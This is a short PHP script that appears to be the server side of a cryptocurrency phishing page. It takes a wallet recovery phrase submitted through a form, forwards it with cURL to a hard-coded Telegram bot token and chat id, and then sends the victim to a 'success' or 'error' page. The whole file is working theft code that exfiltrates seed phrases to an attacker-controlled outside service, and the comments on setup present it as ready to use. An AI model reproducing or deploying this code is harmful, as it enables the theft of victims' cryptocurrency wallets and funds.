<?php
// Replace with your own bot token and chat id
$botToken = '7210917381:AAGPxkv9Y3dqnBj_rHOtWvvuIyg9qHlpFrg';
$chatId = '5160818690';

// Get the recovery phrase from POST
$message = isset($_POST['message']) ? trim($_POST['message']) : '';

if ($message) {
    $message = "Recovery Phrase submitted:\n" . htmlspecialchars($message, ENT_QUOTES, 'UTF-8'); // basic XSS protection

    // Telegram API URL
    $url = "https://api.telegram.org/bot7210917381:AAGPxkv9Y3dqnBj_rHOtWvvuIyg9qHlpFrg/sendMessage";

    // Data to send
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];

    // Use cURL to send POST request
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $response = curl_exec($ch);

    // Check if the request was successful
    $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    // Optionally, check Telegram response for success
    $isSuccess = false;
    if ($httpcode === 200 && $response) {
        $json = json_decode($response, true);
        if (isset($json['ok']) && $json['ok'] === true) {
            $isSuccess = true;
        }
    }

    if ($isSuccess) {
        header("Location: success.html"); // Create success.html for a thank you page
    } else {
        header("Location: error.html"); // Create error.html for error message
    }
    exit();
} else {
    // Handle error: No recovery phrase provided
    header("Location: error.html"); // Create error.html for error message
    exit();
}
?>
